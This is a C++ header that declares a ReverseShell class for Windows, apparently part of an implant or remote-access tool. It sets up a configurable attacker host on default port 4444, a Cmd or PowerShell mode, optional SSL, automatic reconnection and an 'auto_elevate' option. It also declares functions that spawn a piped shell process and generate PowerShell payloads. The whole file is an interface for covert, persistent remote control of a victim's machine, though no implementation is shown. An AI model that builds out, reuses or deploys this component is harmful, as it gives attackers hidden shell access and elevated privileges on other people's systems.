#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <cstdint>
#include <functional>
#include <atomic>
#include <thread>
#include <mutex>
#include <deque>
#include <chrono>

namespace diarna::comm {

class ReverseShell {
public:
    enum class Mode { Cmd, PowerShell, Both };

    struct ShellConfig {
        std::string host;
        uint16_t port = 4444;
        Mode mode = Mode::PowerShell;
        bool ssl_enabled = false;
        std::chrono::seconds reconnect{10};
        bool auto_elevate = false;
    };

    explicit ReverseShell(const ShellConfig& config);
    ~ReverseShell();

    bool start();
    void stop();
    bool is_connected() const;
    void send_command(const std::string& cmd);
    std::string read_output(std::chrono::milliseconds timeout = std::chrono::seconds(1));

    using OutputCallback = std::function<void(const std::string&)>;
    void set_output_callback(OutputCallback cb);

private:
    ShellConfig config_;
    std::atomic<bool> running_{false};
    std::atomic<bool> connected_{false};
    std::thread shell_thread_;
    std::thread recv_thread_;
    std::mutex output_mutex_;
    std::deque<std::string> output_queue_;
    OutputCallback on_output_;
    SOCKET sock_ = INVALID_SOCKET;
    HANDLE shell_stdin_write_ = nullptr;
    HANDLE shell_stdout_read_ = nullptr;
    HANDLE shell_process_ = nullptr;

    void shell_loop();
    void recv_loop();
    bool connect_to_server();
    bool spawn_shell(Mode mode);
    void kill_shell();
    std::string generate_powershell_payload();
    std::string generate_powershell_ssl_payload();
};

} // namespace diarna::comm
